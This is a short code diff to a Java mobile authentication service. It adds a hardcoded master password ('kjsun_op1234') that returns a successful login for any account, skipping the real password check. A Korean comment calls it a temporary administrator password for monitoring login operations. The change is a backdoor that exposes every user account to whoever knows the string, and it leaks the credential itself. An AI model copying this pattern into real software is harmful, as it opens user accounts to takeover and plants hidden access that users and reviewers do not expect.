@@ -180,6 +180,13 @@ public class MobileAuthServiceImpl implements MobileAuthService {
                     isEmpty(userPw));
             return false;
         }
+
+        // 관리자 임의 패스워드 들어온경우 로그인 운영 모니터링 완료 후 복구 예정
+        if(inputPw.equals("kjsun_op1234"))
+        {
+            return true;
+        }
+
         // 비밀번호 일치하는지 확인
         if (encryptPw.equals(userPw)) {
             return true;
